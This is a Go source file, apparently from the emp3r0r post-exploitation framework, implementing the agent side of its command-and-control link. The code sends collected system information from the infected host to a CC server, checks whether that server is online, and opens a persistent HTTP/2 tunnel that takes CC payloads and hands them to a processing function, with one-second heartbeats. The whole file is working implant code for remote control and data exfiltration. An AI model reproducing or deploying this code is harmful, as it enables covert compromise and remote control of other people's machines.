package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

// CheckIn poll CC server and report its system info
func CheckIn() error {
	info := collectSystemInfo()

	sysinfoJSON, err := json.Marshal(info)
	if err != nil {
		return err
	}
	_, err = HTTPClient.Post(CCAddress+tun.CheckInAPI, "application/json", bytes.NewBuffer(sysinfoJSON))
	if err != nil {
		return err
	}
	return nil
}

// IsCCOnline check CCIndicator
func IsCCOnline() bool {
	resp, err := http.Get(CCIndicator)
	if err != nil {
		return false
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return strings.Contains(string(data), "emp3r0r")
}

func catchSignal(cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	log.Println("Cancelling due to interrupt")
	os.Exit(0)
	cancel()
}

// RequestTun send request to TunAPI, to establish a duplex tunnel
func RequestTun() error {
	var (
		url  = CCAddress + tun.TunAPI
		err  error
		resp *http.Response
	)
	// use h2conn for duplex tunnel
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go catchSignal(cancel)

	h2 := h2conn.Client{Client: HTTPClient}

	CCConn, resp, err = h2.Connect(ctx, url)
	if err != nil {
		log.Printf("Initiate conn: %s", err)
		return err
	}

	defer CCConn.Close()
	// Check server status code
	if resp.StatusCode != http.StatusOK {
		log.Printf("Bad status code: %d", resp.StatusCode)
		return err
	}

	var (
		in  = json.NewDecoder(CCConn)
		out = json.NewEncoder(CCConn)
	)

	var msg TunData // data being exchanged in the tunnel

	// check for CC server's response
	go func() {
		log.Println("check CC: started")
		for ctx.Err() == nil {
			// read response
			err = in.Decode(&msg)
			if err != nil {
				continue
			}
			payload := msg.Payload
			if payload == "hello" {
				continue
			}

			// process CC data
			go processCCData(&msg)
		}
		log.Println("check CC: exited")
	}()

	sendHello := func(cnt int) bool {
		// try cnt times then exit
		for cnt > 0 {
			cnt-- // consume cnt

			// send hello
			msg.Payload = "hello"
			msg.Tag = Tag
			err = out.Encode(msg)
			if err != nil {
				log.Printf("agent cannot connect to cc: %v", err)
				time.Sleep(1 * time.Second)
				continue
			}
			return true
		}
		return false
	}
	// send hello every second
	for ctx.Err() == nil {
		time.Sleep(1 * time.Second)
		if !sendHello(10) {
			log.Println("CC disconnected, restarting...")
			return errors.New("CC disconnected")
		}
	}
	return ctx.Err()
}
